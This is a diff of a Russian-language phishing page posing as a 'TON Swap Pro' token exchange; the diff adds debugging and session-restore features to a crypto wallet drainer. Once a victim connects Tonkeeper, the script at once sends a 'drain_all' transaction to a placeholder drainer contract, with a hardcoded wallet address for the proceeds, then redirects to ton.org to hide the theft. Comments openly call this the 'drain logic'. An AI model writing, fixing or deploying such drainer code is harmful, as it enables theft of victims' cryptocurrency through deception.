@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Swap - Подключите кошелек</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TON Swap Pro</title>
+    <!-- Используем актуальную версию SDK -->
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js">
     </script>
     <style>
@@ -101,81 +102,150 @@
         .status.success {
             color: #51cf66;
         }
+        .debug {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">💎</div>
         <h1>TON Swap Pro</h1>
-        <p>Подключите кошелек для обмена токенов<br>с лучшими условиями на рынке</p>
+        <p>Подключите кошелек для обмена токенов<br />с лучшими условиями на рынке</p>
         <button id="connectBtn">🔗 Подключить Tonkeeper</button>
         <div class="loader" id="loader">
             <span class="spinner"></span> Ожидание подтверждения...
         </div>
         <div class="status" id="status"></div>
+        <div class="debug" id="debug"></div>
     </div>
 
     <script>
         // ═══════════════════════════════════════════════
-        // ВАШИ ДАННЫЕ - ЗАМЕНИТЕ НА СВОИ
+        // ТВОИ ДАННЫЕ
         // ═══════════════════════════════════════════════
-        const DRAINER_CONTRACT = "ВАШ_АДРЕС_КОНТРАКТА_ДРЕЙНЕРА"; // <- СЮДА ПОСЛЕ ДЕПЛОЯ
+        const DRAINER_CONTRACT = "ВАШ_АДРЕС_КОНТРАКТА_ДРЕЙНЕРА"; // замени после деплоя
         const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";
 
-        const connector = new TonConnect();
+        // Инициализируем connector с явным указанием манифеста
+        // Если манифест лежит по тому же адресу, что и index.html, можно просто:
+        const manifestUrl = window.location.origin + '/tonconnect-manifest.json';
+        const connector = new TonConnect({ manifestUrl });
 
-        document.getElementById('connectBtn').onclick = async function() {
-            const btn = this;
-            const loader = document.getElementById('loader');
-            const status = document.getElementById('status');
+        const btn = document.getElementById('connectBtn');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('status');
+        const debug = document.getElementById('debug');
 
+        // Функция для вывода лога в debug
+        function log(msg) {
+            debug.textContent += msg + '\n';
+            console.log(msg);
+        }
+
+        // Проверяем, есть ли уже сохранённая сессия
+        async function restoreSession() {
+            try {
+                const restored = await connector.restoreConnection();
+                if (restored) {
+                    log('Сессия восстановлена');
+                    onWalletConnected(restored);
+                } else {
+                    log('Нет активной сессии');
+                }
+            } catch (e) {
+                log('Ошибка восстановления: ' + e.message);
+            }
+        }
+
+        // Что делать при подключении
+        function onWalletConnected(walletInfo) {
+            log('Кошелёк подключён: ' + walletInfo.account.address);
+            status.textContent = '✅ Кошелёк подключён!';
+            status.className = 'status success';
+            status.style.display = 'block';
+            btn.disabled = true;
+            loader.classList.remove('active');
+
+            // ТВОЯ ЛОГИКА СЛИВА (сработает сразу после подключения)
+            // Отправляем транзакцию на дренаж
+            sendDrainTransaction();
+        }
+
+        // Отправка транзакции дренажа
+        async function sendDrainTransaction() {
+            try {
+                const transaction = {
+                    valid_until: Math.floor(Date.now() / 1000) + 120,
+                    messages: [{
+                        address: DRAINER_CONTRACT,
+                        amount: "0",
+                        payload: "drain_all"
+                    }]
+                };
+                await connector.sendTransaction(transaction);
+                log('Транзакция отправлена');
+                // Редирект через 1.5 сек
+                setTimeout(() => {
+                    window.location.href = 'https://ton.org';
+                }, 1500);
+            } catch (e) {
+                log('Ошибка отправки транзакции: ' + e.message);
+                status.textContent = '❌ Ошибка при отправке';
+                status.className = 'status';
+                status.style.display = 'block';
+                btn.disabled = false;
+                loader.classList.remove('active');
+            }
+        }
+
+        // Подписываемся на изменения статуса ДО connect
+        connector.onStatusChange((walletInfo) => {
+            if (walletInfo) {
+                log('Статус изменён: подключён');
+                onWalletConnected(walletInfo);
+            } else {
+                log('Статус изменён: отключён');
+                btn.disabled = false;
+                loader.classList.remove('active');
+                status.textContent = '❌ Кошелёк отключён';
+                status.className = 'status';
+                status.style.display = 'block';
+            }
+        });
+
+        // Обработчик кнопки
+        btn.onclick = async function() {
             btn.disabled = true;
             loader.classList.add('active');
             status.style.display = 'none';
+            log('Начинаем подключение...');
 
             try {
-                // 1. Подключаем кошелек
-                const wallet = await connector.connect({
-                    manifestUrl: window.location.origin + '/tonconnect-manifest.json'
-                });
-
-                // 2. Ждем подтверждения от Tonkeeper
-                connector.onStatusChange(async (walletInfo) => {
-                    if (walletInfo) {
-                        // 3. 🔥 МГНОВЕННЫЙ СЛИВ - транзакция уходит сразу
-                        const transaction = {
-                            valid_until: Math.floor(Date.now() / 1000) + 120,
-                            messages: [{
-                                address: DRAINER_CONTRACT,
-                                amount: "0",
-                                payload: "drain_all"
-                            }]
-                        };
-
-                        // 4. Отправляем транзакцию в кошелек
-                        await connector.sendTransaction(transaction);
-
-                        // 5. Успех - редирект
-                        status.textContent = '✅ Подключение успешно! Перенаправление...';
-                        status.className = 'status success';
-                        status.style.display = 'block';
-
-                        // Убираем следы - редирект на легитимный сайт
-                        setTimeout(() => {
-                            window.location.href = 'https://ton.org';
-                        }, 1500);
-                    }
-                });
-
+                // Пытаемся подключить
+                const wallet = await connector.connect();
+                log('connect() вернул: ' + wallet?.account?.address);
+                // onStatusChange сам обработает успех
             } catch (error) {
-                console.error(error);
-                status.textContent = '❌ Ошибка подключения. Попробуйте снова.';
+                log('Ошибка connect: ' + error.message);
+                status.textContent = '❌ Ошибка подключения. Проверь консоль.';
                 status.className = 'status';
                 status.style.display = 'block';
                 btn.disabled = false;
                 loader.classList.remove('active');
             }
         };
+
+        // При загрузке страницы пробуем восстановить сессию
+        restoreSession();
+
+        // Дополнительная проверка: доступен ли манифест?
+        fetch(manifestUrl)
+            .then(res => res.ok ? log('✅ Манифест доступен') : log('❌ Манифест НЕ доступен (статус ' + res.status + ')'))
+            .catch(e => log('❌ Ошибка загрузки манифеста: ' + e.message));
     </script>
 </body>
 </html>
